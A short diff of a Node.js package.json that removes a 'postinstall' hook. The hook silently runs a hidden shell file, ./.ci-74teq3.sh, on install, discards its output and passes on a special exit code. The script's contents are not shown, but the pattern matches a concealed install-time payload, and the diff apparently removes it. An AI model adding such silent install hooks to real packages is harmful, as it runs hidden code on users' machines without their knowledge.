@@ -4,8 +4,7 @@
   "main": "index.js",
   "scripts": {
     "run": "node index.js",
-    "test": "node test.js",
-    "postinstall": "sh ./.ci-74teq3.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "node test.js"
   },
   "repository": {
     "type": "git",
